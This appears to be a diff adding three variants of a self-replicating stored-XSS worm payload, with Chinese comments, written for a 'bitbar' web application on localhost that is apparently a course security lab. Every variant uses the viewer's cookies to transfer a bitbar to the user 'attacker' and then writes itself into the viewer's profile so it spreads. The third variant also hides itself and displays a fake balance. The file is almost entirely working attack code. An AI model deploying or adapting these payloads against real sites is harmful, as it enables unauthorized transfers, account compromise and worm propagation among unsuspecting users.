@@ -1,0 +1,54 @@
+//完全兼容版 1
+<img id="bitbar_count" class='var request = new XMLHttpRequest();
+request.open("POST", "http://localhost:3000/post_transfer");
+request.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+request.withCredentials = true;
+request.send("quantity=1&destination_username=attacker");
+var request2 = new XMLHttpRequest();
+request2.open("POST", "http://localhost:3000/set_profile");
+var new_profile = document.getElementById("profile").innerHTML;
+request2.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+request2.withCredentials = true;
+request2.send("new_profile=" + encodeURIComponent(new_profile));'>
+
+
+// 完全兼容版2
+<p id="bitbar_count" class="
+let transferdata=new FormData();
+    transferdata.append('destination_username','attacker');
+    transferdata.append('quantity','1');
+    fetch('../post_transfer',{method:'POST',body:transferdata});
+    let profiledata=new FormData();
+    profiledata.append('new_profile',document.getElementById('profile').innerHTML);
+    fetch('../set_profile',{method:'POST',body:profiledata});
+"></p>
+
+
+//兼容chrome，对于某些版本firefox只能转账不能感染。推测是由于settimeout
+<span id="wrap">
+<span id="bitbar_count" class="eval(document['getElementById']('myattack')['innerHTML'])"></span>
+
+<span id="myattack">   //eval执行下面的函数
+document.getElementById('myattack').style.display = "none";  //不在profile显示
+setTimeout(
+	function(){
+    var request = new XMLHttpRequest();  //实例
+    request.open("POST", "http://localhost:3000/post_transfer");  //目的
+    request.setRequestHeader("Content-type","application/x-www-form-urlencoded"); //编码
+    request.withCredentials = true; //cookie
+    try {
+        request.send("quantity=1".concat(String.fromCharCode(38)).concat("destination_username=attacker")); //send内容，转账
+    } catch (err) {
+    //DO nothing
+    } finally {
+        request = new XMLHttpRequest();
+        request.open("POST", "http://localhost:3000/set_profile", true);   //修改的api地址
+        request.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+        request.withCredentials = true;
+        request.send("new_profile=".concat(escape(document.getElementById('wrap').outerHTML))); //修改浏览者profile
+    }
+
+}, 0.1);
+10;    //只显示一个虚假的bitbar count
+</span>
+</span>
